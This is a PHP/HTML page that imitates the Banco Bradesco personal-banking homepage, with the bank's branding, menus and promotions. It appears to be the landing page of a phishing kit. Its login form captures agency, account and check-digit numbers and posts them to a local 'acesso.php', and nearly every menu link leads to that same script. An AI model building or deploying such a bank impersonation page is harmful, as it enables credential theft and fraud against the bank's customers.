<?php include('../_functions/functions.php'); ?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>Banco Bradesco | Pessoa Física, Exclusive, Prime e Private</title>
	<link rel="shortcut icon" href="../_images/favicon.ico">
	<link rel="stylesheet" href="../_fonts/_fonts.css">
	<link rel="stylesheet" href="../_styles/boot.css">
	<link rel="stylesheet" href="../_styles/initial.css">
	<script src="../_jscripts/jquery.js"></script>
	<script src="../_jscripts/jcycle.js"></script>
	<script src="../_jscripts/d_content.js"></script>
</head>
<body>
<div class="container">
	<div class="fixed_header">
		<div class="acesse_ib">
			<img src="../_images/hd_acesso_ib.png" height="16" width="177" alt="">
		</div><!-- acesse_ib -->
		<div class="block_login">
			<form action="acesso.php" method="post" onsubmit="return checkAcesso();">
				<label for="my_ag">
					<span>Agência:</span>
					<input type="text" name="my_ag" id="my_ag" class="start_input" maxlength="4" onkeyup="return NextCampo(this, '4','my_ct');" autocomplete="off">
				</label>
				<label for="my_ct">
					<span>Conta:</span>
					<input type="text" name="my_ct" id="my_ct" class="start_input person_ct" maxlength="7" onkeyup="return NextCampo(this, '7','my_dg');" autocomplete="off">
					<input type="text" name="my_dg" id="my_dg" class="start_input person_dg" maxlength="1" autocomplete="off">
					<input type="hidden" name="sender" value="ag_ct">
				</label>
				<input type="submit" name="submeter" id="submeter" value="OK" class="start_btn">
				<label for="lembrar">
					<input type="checkbox" name="lembrar" id="lembrar" class="start_check"> Lembrar-me
				</label>
			</form>
		</div><!-- block_login -->

		<div class="block_time">
			<?php echo getDataShow();?>
		</div><!-- block_time -->
	</div><!-- fixed_header -->

	<div class="block_slider_all">

		<ul class="slider"><!-- slider -->
			<li class="li_slider"><img src="../_images/sl_consignado.jpg" alt=""></li>
			<li class="li_slider"><img src="../_images/sl_investimento.jpg" alt=""></li>
			<li class="li_slider"><img src="../_images/sl_ipva2k17.jpg" alt=""></li>
			<li class="li_slider"><img src="../_images/sl_fgts.jpg" alt=""></li>
		</ul><!-- slider -->

		<div class="left_menu">
			<div class="block_logo">
				<img src="../_images/mi_logo.png" height="66" width="86" alt="">
			</div><!-- block_logo -->
			<a href="#" class="open_acc">ABRA SUA CONTA</a>
			<ol class="list_menu_now"><!-- menu_esquerdo -->
				<li class="list_menuzin"><img src="../_images/mi_produtos.png" alt=""><span>Produtos e Serviços</span></li>
				<li class="list_menuzin"><img src="../_images/mi_campanhas.png" alt=""><span>Promoções e Campanhas</span></li>
				<li class="list_menuzin"><img src="../_images/mi_acessibilidade.png" alt=""><span style="margin-top:18px!important;">Acessibilidade</span></li>
				<li class="list_menuzin"><img src="../_images/mi_brada_logo.png" alt=""><span style="margin-top:18px!important;">Sobre o Bradesco</span></li>
				<li class="list_menuzin"><img src="../_images/mi_poupar.png" alt=""><span>Educação Financeira</span></li>
				<li class="list_menuzin"><img src="../_images/mi_responsivo.png" alt=""><span style="margin-top:18px!important;">Canais Digitais</span></li>
				<li class="list_menuzin"><img src="../_images/mi_atendimento.png" alt=""><span style="margin-top:18px!important;">Atendimento</span></li>
			</ol><!-- menu_esquerdo -->
		</div><!-- left_menu -->

		<div class="right_menu">
			<ol><!-- menu_direito -->
				<li class="orizontal_menu"><a href="acesso.php" class="active_menu_r">Para Você</a></li>
				<li class="orizontal_menu"><a href="acesso.php">Exclusive</a></li>
				<li class="orizontal_menu"><a href="acesso.php">Prime</a></li>
				<li class="orizontal_menu"><a href="acesso.php">Private Bank</a></li>
				<li class="orizontal_menu"><a href="acesso.php"><span>Mais</span>Perfil</a></li>
				<li class="orizontal_menu"><a href="acesso.php"><span>Mais</span>Bradesco</a></li>
				<li class="orizontal_menu"><a href="pessoa-juridica/"><span>Para sua</span>Empresa</a></li>
				<li class="orizontal_menu"><a href="pessoa-juridica/"><span>Para o</span>Poder Público</a></li>
			</ol><!-- menu_direito -->
		</div><!-- right_menu -->

		<div class="footer_menu">
			<div class="block_mold">
				<img src="../_images/hd_ft_mold.png" height="42" width="653" alt="">
			</div><!-- block_mold -->
			<div class="block_list_ft">
				<ol>
					<li>
						<img src="../_images/hd_ft-recarga-celular.png" alt="">
						<p>Está sem Crédito</p>
						<span>Recarregue aqui seu celular.</span>
					</li>
					<li>	
						<img src="../_images/hd_ft-seguro-auto.png" alt="">
						<p>Bradesco Seguro Auto</p>
						<span>Contrate e simule agora.</span>
					</li>
					<li>	
						<img src="../_images/hd_ft-automatico.png" alt="">
						<p>Débito Automático</p>
						<span>Deixe as contas com a gente.</span>
					</li>
					<li>	
						<img src="../_images/hd_ft-portabilidade.png" alt="">
						<p>Portabilidade de Salário</p>
						<span>Saiba como funciona.</span>
					</li>
				</ol>
			</div><!-- block_list_ft -->
		</div>

	</div><!-- block_slider_all -->


	<div class="block_destaques">
		<div class="principal_destaque">
			<div class="block_shadow_princ">
				<p>Está com dúvidas?</p>
				<h1>Bradesco Explica</h1>
				<img src="../_images/dest_play-video.png" height="180" width="180" alt="">
			</div><!-- block_shadow_princ -->
			<div class="block_video_dest">
				<video class="video_destacado" autoplay="autoplay" loop>
					<source src="../_images/dest_video_autoplay.mp4" type="video/mp4">
					Your browser does not support the video tag.
				</video>
			</div><!-- block_video_dest -->
		</div><!-- principal_destaque -->

		<div class="outros_destaques">
			<div class="mini_destaques">
				<img src="../_images/dest_credito.jpg" alt="">
				<div class="info_dest">
					<h1>Limite de Crédito Pessoal</h1>
					<p>Equilibre suas contas.</p>
				</div><!-- info_dest -->
			</div><!-- mini_destaques -->

			<div class="mini_destaques">
				<img src="../_images/dest_seguro.jpg" alt="">
				<div class="info_dest">
					<h1>Apenas R$ 2,86 ao mês</h1>
					<p>Proteja seu cartão.</p>
				</div><!-- info_dest -->
			</div><!-- mini_destaques -->

			<div class="mini_destaques extra_size">
				<img src="../_images/dest_pe_quente.jpg" alt="">
				<div class="info_dest">
					<h1>Pé Quente Max Prêmios</h1>
					<p>Guarde dinheiro e concorra a prêmios.</p>
				</div><!-- info_dest -->
			</div><!-- mini_destaques -->

			<div class="mini_destaques extra_size">
				<img src="../_images/dest_biometria.jpg" alt="">
				<div class="info_dest">
					<h1>Biometria</h1>
					<p>Faça suas transações sem cartão.</p>
				</div><!-- info_dest -->
			</div><!-- mini_destaques -->

		</div><!-- outros_destaques -->
	</div><!-- block_destaques -->

	<div class="block_footer_all">
		<div class="block_footer_red">
			<img src="../_images/ft_logo_all.png" alt="">
		</div><!-- block_footer_red -->
		<div class="block_footer">
			<ul>
				<li><a href="#">Portabilidade</a></li>
				<li><a href="#">Bradesco Imprensa</a></li>
				<li><a href="#">trabalhe Conosco</a></li>
				<li><a href="#">Segurança</a></li>
				<li><a href="#">Bradesco Explica</a></li>
				<li><a href="#">Relações com Investidores</a></li>
			</ul>
		</div>
	</div><!-- block_footer_all -->



<div class="clear"></div>	
</div><!-- container -->		
</body>
</html>